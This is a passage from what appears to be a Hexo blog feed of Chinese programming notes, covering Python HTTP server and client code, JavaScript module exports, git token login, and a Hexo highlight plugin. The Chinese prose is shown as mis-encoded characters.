Failed\n&quot;</span>)</span><span class="line">            self.wfile.write(<span class="hljs-string">&quot;Token Failed&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">server_class=HTTPServer, handler_class=S, port=<span class="hljs-number">8080</span></span>):</span></span><span class="line">    logging.basicConfig(level=logging.INFO)</span><span class="line">    server_address = (<span class="hljs-string">&#x27;&#x27;</span>, port)</span><span class="line">    httpd = server_class(server_address, handler_class)</span><span class="line">    logging.info(<span class="hljs-string">&#x27;Starting httpd...\n&#x27;</span>)</span><span class="line">    <span class="hljs-keyword">try</span>:</span><span class="line">        httpd.serve_forever()</span><span class="line">    <span class="hljs-keyword">except</span> KeyboardInterrupt:</span><span class="line">        <span class="hljs-keyword">pass</span></span><span class="line">    httpd.server_close()</span><span class="line">    logging.info(<span class="hljs-string">&#x27;Stopping httpd...\n&#x27;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) == <span class="hljs-number">2</span>:</span><span class="line">        run(port=<span class="hljs-built_in">int</span>(argv[<span class="hljs-number">1</span>]))</span><span class="line">    <span class="hljs-keyword">else</span>:</span><span class="line">        run()</span></code></pre></div></div><h2 id="http-Client"><a href="#http-Client" class="headerlink" title="http Client"></a>http Client</h2><p>æ¨èä¸¤ä¸ªæ¨¡å—<code>urllib3</code>å’Œ<code>requests</code></p><h3 id="requests-æ¨¡å—"><a href="#requests-æ¨¡å—" class="headerlink" title="requests æ¨¡å—"></a>requests æ¨¡å—</h3><p><a href="https://docs.python-requests.org/zh_CN/latest/user/quickstart.html">å®˜æ–¹å‚è€ƒé“¾æ¥</a></p><h4 id="å‘é€è¯·æ±‚"><a href="#å‘é€è¯·æ±‚" class="headerlink" title="å‘é€è¯·æ±‚"></a>å‘é€è¯·æ±‚</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> requests</span><span class="line"></br></span><span class="line">r = requests.get(<span class="hljs-string">&#x27;https://api.github.com/events&#x27;</span>)</span><span class="line">r = requests.post(<span class="hljs-string">&#x27;http://httpbin.org/post&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)</span><span class="line">r = requests.put(<span class="hljs-string">&#x27;http://httpbin.org/put&#x27;</span>, data = &#123;<span class="hljs-string">&#x27;key&#x27;</span>:<span class="hljs-string">&#x27;value&#x27;</span>&#125;)</span><span class="line">r = requests.delete(<span class="hljs-string">&#x27;http://httpbin.org/delete&#x27;</span>)</span><span class="line">r = requests.head(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>)</span><span class="line">r = requests.options(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>)</span></code></pre></div></div><h4 id="ä¼ é€’URLä¿¡æ¯å’Œå“åº”ä¿¡æ¯"><a href="#ä¼ é€’URLä¿¡æ¯å’Œå“åº”ä¿¡æ¯" class="headerlink" title="ä¼ é€’URLä¿¡æ¯å’Œå“åº”ä¿¡æ¯"></a>ä¼ é€’URLä¿¡æ¯å’Œå“åº”ä¿¡æ¯</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">payload = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;</span><span class="line">r = requests.get(<span class="hljs-string">&quot;http://httpbin.org/get&quot;</span>, params=payload)</span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(r.url)</span><span class="line"><span class="hljs-comment"># http://httpbin.org/get?key2=value2&amp;key1=value1</span></span><span class="line"></br></span><span class="line">r.text  <span class="hljs-comment"># uè§£ç åçš„</span></span><span class="line">r.content <span class="hljs-comment"># bæœªè§£ç çš„</span></span><span class="line">r.encoding = <span class="hljs-string">&#x27;gbk2312&#x27;</span> <span class="hljs-comment"># æŒ‡å®šè§£ç ç±»å‹</span></span></code></pre></div></div><h4 id="å®šåˆ¶è¯·æ±‚å¤´"><a href="#å®šåˆ¶è¯·æ±‚å¤´" class="headerlink" title="å®šåˆ¶è¯·æ±‚å¤´"></a>å®šåˆ¶è¯·æ±‚å¤´</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">url = <span class="hljs-string">&#x27;https://api.github.com/some/endpoint&#x27;</span></span><span class="line">headers = &#123;<span class="hljs-string">&#x27;user-agent&#x27;</span>: <span class="hljs-string">&#x27;my-app/0.0.1&#x27;</span>&#125;</span><span class="line">cookies = <span class="hljs-built_in">dict</span>(cookies_are=<span class="hljs-string">&#x27;working&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line">r = requests.get(url, headers=headers, cookies=cookies)</span><span class="line"></br></span><span class="line">r.request.headers <span class="hljs-comment"># æŸ¥çœ‹è¯·æ±‚å¤´éƒ¨</span></span><span class="line">r.headers  <span class="hljs-comment"># æŸ¥çœ‹å“åº”å¤´éƒ¨</span></span></code></pre></div></div><h4 id="å“åº”çŠ¶æ€ç "><a href="#å“åº”çŠ¶æ€ç " class="headerlink" title="å“åº”çŠ¶æ€ç "></a>å“åº”çŠ¶æ€ç </h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">r = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/get&#x27;</span>)</span><span class="line">r.status_code</span><span class="line"><span class="hljs-comment"># 200</span></span><span class="line"></br></span><span class="line">r.status_code == requests.codes.ok</span><span class="line"><span class="hljs-comment"># True</span></span><span class="line"></br></span><span class="line">bad_r = requests.get(<span class="hljs-string">&#x27;http://httpbin.org/status/404&#x27;</span>)</span><span class="line">bad_r.status_code</span><span class="line"><span class="hljs-comment"># 404</span></span><span class="line">bad_r.raise_for_status() <span class="hljs-comment"># é”™è¯¯å°†æŠ›å‡ºå¼‚å¸¸ï¼Œå¦åˆ™ä¸ºNone</span></span></code></pre></div></div><h4 id="é‡å®šå‘å†å²"><a href="#é‡å®šå‘å†å²" class="headerlink" title="é‡å®šå‘å†å²"></a>é‡å®šå‘å†å²</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">r = requests.get(<span class="hljs-string">&#x27;http://github.com&#x27;</span>)</span><span class="line">r.url</span><span class="line"><span class="hljs-comment"># &#x27;https://github.com/&#x27;</span></span><span class="line">r.status_code</span><span class="line"><span class="hljs-comment"># 200</span></span><span class="line">r.history</span><span class="line"><span class="hljs-comment"># [&lt;Response [301]&gt;]</span></span><span class="line"></br></span><span class="line">r = requests.get(<span class="hljs-string">&#x27;http://github.com&#x27;</span>, allow_redirects=<span class="hljs-literal">False</span>)</span><span class="line">r.status_code</span><span class="line"><span class="hljs-comment"># 301</span></span><span class="line">r.history</span><span class="line"><span class="hljs-comment"># []</span></span></code></pre></div></div><h3 id="urllib3-æ¨¡å—"><a href="#urllib3-æ¨¡å—" class="headerlink" title="urllib3 æ¨¡å—"></a>urllib3 æ¨¡å—</h3><p>POST æ–¹æ³•å‚è€ƒ</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> urllib3 <span class="hljs-keyword">import</span> PoolManager</span><span class="line"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode, urljoin</span><span class="line"><span class="hljs-keyword">import</span> chardet</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_chapters</span>()</span></span><span class="line marked"><span class="hljs-function">    <span class="hljs-title">http</span> = <span class="hljs-title">PoolManager</span>()</span></span><span class="line"></br></span><span class="line"><span class="hljs-function">    <span class="hljs-title">post_url</span> = &#x27;<span class="hljs-title">https</span>:</span>//info.support.huawei.com/network/ptmngsys/getTsrevList<span class="hljs-string">&#x27;</span></span><span class="line"><span class="hljs-string">    data = &#123;</span></span><span class="line"><span class="hljs-string">        &#x27;</span>lang<span class="hljs-string">&#x27;: &#x27;</span>CN<span class="hljs-string">&#x27;,</span></span><span class="line"><span class="hljs-string">        &#x27;</span>family<span class="hljs-string">&#x27;: family_str</span></span><span class="line"><span class="hljs-string">    &#125;</span></span><span class="line marked"><span class="hljs-string">    res = http.request(&#x27;</span>POST<span class="hljs-string">&#x27;, post_url, body=urlencode(data),</span></span><span class="line marked"><span class="hljs-string">                       headers=&#123;</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Cookie<span class="hljs-string">&#x27;: &#x27;</span>JSESSIONID=F5D938CEFxxxxxxxxxxxxx4559465B96; infosupport_network_ptmngsys_sticky=pro_dggpmw1tmc02615.huawei.com_8080:<span class="hljs-number">3</span>; hwsso_uniportal=<span class="hljs-string">&quot;&quot;</span>; hwsso_login=<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&#x27;,</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Host<span class="hljs-string">&#x27;: &#x27;</span>info.support.huawei.com<span class="hljs-string">&#x27;,</span></span><span class="line marked"><span class="hljs-string">                           &#x27;</span>Content-<span class="hljs-type">Type</span><span class="hljs-string">&#x27;: &#x27;</span>application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><span class="hljs-string">&#x27;</span></span><span class="line marked"><span class="hljs-string">    &#125;</span></span><span class="line marked"><span class="hljs-string">    )</span></span><span class="line"><span class="hljs-string">    if res.status != 200:</span></span><span class="line"><span class="hljs-string">        print(&quot;Can&#x27;</span>t <span class="hljs-built_in">open</span> web, check cookie value.<span class="hljs-string">&quot;)</span></span><span class="line"><span class="hljs-string">        return</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    encode_type = chardet.detect(res.data)  # è‡ªåŠ¨åˆ¤æ–­ç¼–ç ç±»å‹</span></span><span class="line"><span class="hljs-string">    body = res.data.decode(encode_type[&#x27;encoding&#x27;])</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript çš„exportå¯¼å‡ºæ–¹å¼</title>
      <link href="/2021/07/15/js-module-export/"/>
      <url>/2021/07/15/js-module-export/</url>
      
        <content type="html"><![CDATA[<h2 id="javascript-çš„ä¸¤ç§æ ¼å¼"><a href="#javascript-çš„ä¸¤ç§æ ¼å¼" class="headerlink" title="javascript çš„ä¸¤ç§æ ¼å¼"></a>javascript çš„ä¸¤ç§æ ¼å¼</h2><p>javascript ä¸­æœ‰ä¸¤ç§æ ¼å¼æ¨¡å—</p><ol><li>Nodejs çš„ <code>CommonJS</code>æ¨¡å—ï¼Œç®€ç§°<code>CJS</code></li><li>ES6æ¨¡å—ï¼Œç®€ç§°<code>ESM</code></li></ol><p>å¼•å…¥çš„æ–¹å¼åŒºåˆ«å¦‚ä¸‹ï¼š</p><p><img src="/2021/07/15/js-module-export/1.png"></p><p>CJSçš„å¯¼å‡ºéƒ½æ˜¯<code>exports</code>ï¼Œè€Œ<code>ESM</code>çš„å¯¼å‡ºéƒ½æ˜¯<code>export</code></p><h2 id="CJS-çš„å¼•å…¥"><a href="#CJS-çš„å¼•å…¥" class="headerlink" title="CJS çš„å¼•å…¥"></a>CJS çš„å¼•å…¥</h2><p>ä½¿ç”¨ä¸¤ä¸ªæ–‡ä»¶æ¥åšæµ‹è¯•ï¼Œ<code>utils.js</code> å’Œ <code>test.js</code></p><h3 id="module-exports"><a href="#module-exports" class="headerlink" title="module.exports"></a>module.exports</h3><div class="codeBlockContainer"><div class="codeBlockTitle">utils.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> a = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-keyword">const</span> b = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-built_in">module</span>.exports = a;</span><span class="line"><span class="hljs-built_in">module</span>.exports = b;</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>);</span><span class="line"><span class="hljs-built_in">console</span>.log(utils); <span class="hljs-comment">// [Function: b]</span></span></code></pre></div></div><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§æ–¹æ³•åªèƒ½å¯¼å‡ºä¸€ä¸ªå‡½æ•°</p><h3 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h3><div class="codeBlockContainer"><div class="codeBlockTitle">utils.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-built_in">exports</span>.a = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y;</span><span class="line"><span class="hljs-built_in">exports</span>.b = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x - y;</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">test.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./utils&#x27;</span>);</span><span class="line"><span class="hljs-built_in">console</span>.log(utils); <span class="hljs-comment">//&#123; a: [Function (anonymous)], b: [Function (anonymous)] &#125;</span></span></code></pre></div></div><p>è¿™ç§æ–¹æ³•å¯ä»¥å¯¼å‡ºå¤šä¸ªå‡½æ•°</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git push å…å¯†æ‰§è¡Œ</title>
      <link href="/2021/07/14/git-push-%E5%85%8D%E5%AF%86%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/14/git-push-%E5%85%8D%E5%AF%86%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>æ€è·¯æ˜¯ä½¿ç”¨githubçš„tokenæ¥è¿›è¡Œç™»å½•</p><ul><li><a href="https://segmentfault.com/q/1010000000590947">å‚è€ƒè¿™ç¯‡</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">git config --global credential.helper store</span></code></pre></div></div><p>ç„¶ååœ¨pushçš„æ—¶å€™è¾“å…¥çš„å¯†ç ä¸ºtokenå€¼</p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo highlight æ’ä»¶ç¼–å†™</title>
      <link href="/2021/07/13/hexo-highlight-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
      <url>/2021/07/13/hexo-highlight-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="æ’ä»¶ç¼–å†™æ€è·¯"><a href="#æ’ä»¶ç¼–å†™æ€è·¯" class="headerlink" title="æ’ä»¶ç¼–å†™æ€è·¯"></a>æ’ä»¶ç¼–å†™æ€è·¯</h2><p>é¦–å…ˆè¦ç¼–å†™hexoçš„æ’ä»¶éœ€è¦æµè§ˆ<a href="https://hexo.io/zh-cn/api/">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><p>ç¼–å†™æ’ä»¶çš„åˆè¡·æ˜¯å› ä¸ºhexoçš„ä»£ç å—æœ‰ä»¥ä¸‹å‡ ç‚¹ä¸è¶³ï¼š</p><ol><li>å¯¹ä»£ç å—æ ‡é¢˜çš„æ˜¾ç¤ºä¸å¤Ÿå¥½</li><li>ä»£ç å—çš„é«˜äº®åªèƒ½æ˜¯<code>&#123;% codeblock mark:2%&#125;</code>çš„å†™æ³•æ‰å¯ä»¥ï¼Œå¹¶ä¸æ˜¯é€šç”¨å†™æ³•ã€‚</li><li>ç¼ºå°‘ä»£ç ä¸­é—´æ·»åŠ <code>highlight-next-line</code>ç­‰æ³¨é‡Šå¯ä»¥é«˜äº®çš„åŠŸèƒ½</li><li>ä»£ç å—çš„htmlç»“æ„ä¸å¤Ÿæ¸…æ™°ã€‚</li></ol><p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬è¦åšçš„è¦ä¹ˆæ˜¯ç›´æ¥ä¿®æ”¹æºç è¦ä¹ˆå°±æ˜¯æ·»åŠ ä¸€ä¸ªæ’ä»¶ã€‚</p><h2 id="ç¼–å†™æ’ä»¶çš„å‡†å¤‡å·¥ä½œ"><a href="#ç¼–å†™æ’ä»¶çš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="ç¼–å†™æ’ä»¶çš„å‡†å¤‡å·¥ä½œ"></a>ç¼–å†™æ’ä»¶çš„å‡†å¤‡å·¥ä½œ</h2><p>æ–°åˆ›å»ºä¸€ä¸ª<code>hexo</code>å®ä¾‹åï¼Œåœ¨<code>node_modules</code>æ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªä»¥<code>hexo-</code>å¼€å¤´çš„æ–‡ä»¶å¤¹ã€‚æˆ‘çš„ä¸º<code>hexo-highlight-mark</code>ã€‚<br>ç„¶åè¿›å…¥æ–‡ä»¶å¤¹ä¸­æ‰§è¡Œ<code>npm init</code>æ¥åˆå§‹åŒ–npmåŒ…ï¼Œè¿™é‡Œçš„é—®ç­”å¯ä»¥ç›´æ¥ä¸€è·¯å›è½¦ï¼Œåé¢å†åœ¨<code>package.json</code>ä¸­ä¿®æ”¹ã€‚</p><p>æ–°å»º<code>index.js</code>æ–‡ä»¶ä½œä¸ºå…¥å£æ–‡ä»¶ã€‚</p><p>åœ¨æ ¹ç›®å½•ä¸­çš„<code>package.json</code>æ–‡ä»¶ä¸­æ·»åŠ æ’ä»¶çš„åç§°å’Œç‰ˆæœ¬å·ï¼Œæ­¤æ—¶æ’ä»¶å°±å¯ä»¥ä»¥æœ€å°å•ä½è¿è¡Œäº†ã€‚</p><h2 id="å¦‚ä½•ä¿®æ”¹ä»£ç å—ç»“æ„"><a href="#å¦‚ä½•ä¿®æ”¹ä»£ç å—ç»“æ„" class="headerlink" title="å¦‚ä½•ä¿®æ”¹ä»£ç å—ç»“æ„"></a>å¦‚ä½•ä¿®æ”¹ä»£ç å—ç»“æ„</h2><p>è¿™ä¸ªæ’ä»¶è¦ä¿®æ”¹ä»£ç å—çš„ç»“æ„ï¼Œå¯ä»¥ç”¨åˆ°<a href="https://hexo.io/zh-cn/api/filter">è¿‡æ»¤å™¨</a>ã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">index.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-meta">&#x27;use strict&#x27;</span>;</span><span class="line"></br></span><span class="line">hexo.extend.filter.register(<span class="hljs-string">&#x27;before_post_render&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./lib/filter&#x27;</span>), <span class="hljs-number">8</span>);</span></code></pre></div></div><p><code>before_post_render</code>æ˜¯è¿‡æ»¤å™¨åœ¨æ–‡ç« æ¸²æŸ“ä¹‹å‰å°±ä»‹å…¥æ‰§è¡Œã€‚</p><div class="codeBlockContainer"><div class="codeBlockTitle">./lib/filter.js</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-javascript codeBlockLines"><span class="line"><span class="hljs-keyword">const</span> rBacktick = <span class="hljs-regexp">/^((?:[^\S\r\n]*&gt;)&#123;0,3&#125;[^\S\r\n]*)(`&#123;3,&#125;|~&#123;3,&#125;)[^\S\r\n]*((?:.*?[^`\s])?)[^\S\r\n]*\n((?:[\s\S]*?\n)?)(?:(?:[^\S\r\n]*&gt;)&#123;0,3&#125;[^\S\r\n]*)\2[^\S\r\n]?(\n+|$)/gm</span>;</span><span class="line"></br></span><span class="line"><span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;</span><span class="line">    <span class="hljs-keyword">const</span> dataContent = data.content;</span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">if</span> ((!dataContent.includes(<span class="hljs-string">&#x27;```&#x27;</span>) &amp;&amp; !dataContent.includes(<span class="hljs-string">&#x27;~~~&#x27;</span>)) || (!hljsCfg.enable &amp;&amp; !prismCfg.enable)) <span class="hljs-keyword">return</span>;</span><span class="line"></br></span><span class="line marked">    data.content = dataContent.replace(rBacktick, <span class="hljs-function">(<span class="hljs-params">$<span class="hljs-number">0</span>, start, $<span class="hljs-number">2</span>, _args, _content, end</span>) =&gt;</span> &#123;</span><span class="line marked">        <span class="hljs-comment">// do something</span></span><span class="line marked">    &#125;</span><span class="line">&#125;</span></code></pre></div></div><p>ä¸Šé¢çš„ä»£ç å°±æ˜¯å°†<code>data.content</code>ä¸­çš„ä»£ç å—éƒ¨åˆ†è¿›è¡ŒåŒ¹é…å¹¶ä¸”è‡ªå®šä¹‰æ¸²æŸ“å¹¶è¿”å›æ›¿æ¢åŸå†…å®¹ã€‚</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>é…ç½®è°ƒè¯•æ–‡ä»¶å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/launch.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line">    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;configurations&quot;</span>: [</span><span class="line">        &#123;</span><span class="line">            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;pwa-node&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch Program&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;\\node_modules\\hexo\\bin\\hexo&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;args&quot;</span>: [</span><span class="line">                <span class="hljs-string">&quot;g&quot;</span>,</span><span class="line">                <span class="hljs-string">&quot;--debug&quot;</span></span><span class="line">            ],</span><span class="line marked">            <span class="hljs-attr">&quot;preLaunchTask&quot;</span>: <span class="hljs-string">&quot;npm: clean&quot;</span></span><span class="line">        &#125;</span><span class="line">    ]</span><span class="line">&#125;</span></code></pre></div></div><p>é…ç½®å‰ç½®ä»»åŠ¡ï¼Œæ¸…é™¤åŸæœ‰çš„æ•°æ®</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/tasks.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line"><span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;2.0.0&quot;</span>,</span><span class="line"><span class="hljs-attr">&quot;tasks&quot;</span>: [</span><span class="line">&#123;</span><span class="line"><span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;npm&quot;</span>,</span><span class="line marked"><span class="hljs-attr">&quot;script&quot;</span>: <span class="hljs-string">&quot;clean&quot;</span>,  <span class="hljs-comment">// åç§°å¿…é¡»ç›¸åŒï¼Œå¤§å°å†™æ•æ„Ÿ</span></span><span class="line"><span class="hljs-attr">&quot;problemMatcher&quot;</span>: [],</span><span class="line"><span class="hljs-attr">&quot;label&quot;</span>: <span class="hljs-string">&quot;npm: clean&quot;</span>,</span><span class="line"><span class="hljs-attr">&quot;detail&quot;</span>: <span class="hljs-string">&quot;hexo clean&quot;</span></span><span class="line">&#125;</span><span class="line">]</span><span class="line">&#125;</span></code></pre></div></div><h2 id="å‘å¸ƒåˆ°npm"><a href="#å‘å¸ƒåˆ°npm" class="headerlink" title="å‘å¸ƒåˆ°npm"></a>å‘å¸ƒåˆ°npm</h2><p>è¦å‘å¸ƒnpmï¼Œéœ€è¦æ³¨å†Œ<a href="www.npmjs.com">npmè´¦å·</a></p><p>ç„¶ååœ¨æ’ä»¶æ–‡ä»¶å¤¹ä¿®æ”¹å¥½<code>package.json</code>ç„¶åè¿è¡Œç™»å½•å’Œå‘å¸ƒå‘½ä»¤å³å¯</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">npm login  <span class="hljs-comment"># ç™»å½•</span></span><span class="line">npm publish  <span class="hljs-comment"># å‘å¸ƒæ–‡ä»¶</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> å‰ç«¯æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python ä¸€åŠ³æ°¸é€¸çš„ decode å­—ç¬¦ä¸²è½¬æ¢æ–¹æ³•</title>
      <link href="/2021/07/12/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2/"/>
      <url>/2021/07/12/python-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="è‡ªåŠ¨æ£€æµ‹å­—ç¬¦ä¸²ç±»å‹å¹¶è¿›è¡Œdecode"><a href="#è‡ªåŠ¨æ£€æµ‹å­—ç¬¦ä¸²ç±»å‹å¹¶è¿›è¡Œdecode" class="headerlink" title="è‡ªåŠ¨æ£€æµ‹å­—ç¬¦ä¸²ç±»å‹å¹¶è¿›è¡Œdecode"></a>è‡ªåŠ¨æ£€æµ‹å­—ç¬¦ä¸²ç±»å‹å¹¶è¿›è¡Œdecode</h2><ul><li><a href="https://blog.csdn.net/jieli_/article/details/70166244">çœ‹è¿™ç¯‡æ–‡ç« </a></li></ul><p>å½“ä¸æ¸…æ¥šå­—ç¬¦ä¸²æ˜¯ä»€ä¹ˆç±»å‹çš„æ—¶å€™ï¼Œæ¯”å¦‚htmlï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨<code>chardet</code>æ¨¡å—æ¥è¿›è¡Œè¯†åˆ«</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> chardet   <span class="hljs-comment">#éœ€è¦å¯¼å…¥è¿™ä¸ªæ¨¡å—ï¼Œæ£€æµ‹ç¼–ç æ ¼å¼</span></span><span class="line">encode_type = chardet.detect(html)  </span><span class="line">html = html.decode(encode_type[<span class="hljs-string">&#x27;encoding&#x27;</span>]) <span class="hljs-comment">#è¿›è¡Œç›¸åº”è§£ç ï¼Œèµ‹ç»™åŸæ ‡è¯†ç¬¦ï¼ˆå˜é‡ï¼‰</span></span><span class="line">ä»<span class="hljs-built_in">str</span>åˆ°<span class="hljs-built_in">bytes</span>:è°ƒç”¨æ–¹æ³•encode().</span><span class="line">ç¼–ç æ˜¯æŠŠUnicodeå­—ç¬¦ä¸²ä»¥å„ç§æ–¹å¼ç¼–ç æˆä¸ºæœºå™¨èƒ½è¯»æ‡‚çš„ASCIIå­—ç¬¦ä¸²</span><span class="line">ä»<span class="hljs-built_in">bytes</span>åˆ°<span class="hljs-built_in">str</span>:è°ƒç”¨æ–¹æ³•decode().</span></code></pre></div></div><h2 id="UnicodeDecodeError"><a href="#UnicodeDecodeError" class="headerlink" title="UnicodeDecodeError"></a>UnicodeDecodeError</h2><p>å½“å‡ºç°<code>UnicodeDecodeError: &#39;gbk&#39; codec can&#39;t decode byte ...</code>ï¼ŒåŸå› æ˜¯æ–‡æ¡£ä¸­çš„ç‰¹æ®Šç¬¦å·è¶…è¿‡äº†gbkçš„å­—ç¬¦é›†ã€‚</p><p>æ‰€ä»¥è¦ä¹ˆä½¿ç”¨æ›´å¹¿çš„<code>gb18030</code>è¦ä¹ˆå¿½ç•¥:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">open</span>(<span class="hljs-type">path</span>, encoding=<span class="hljs-string">&#x27;gb18030&#x27;</span>)   # æ›´å¹¿çš„å­—ç¬¦é›†</span><span class="line"><span class="hljs-keyword">open</span>(<span class="hljs-type">path</span>, encoding=<span class="hljs-string">&#x27;gb18030&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)   # æ›´å¹¿çš„å­—ç¬¦é›†ï¼Œå¹¶ä¸”é”™è¯¯çš„å¿½ç•¥</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
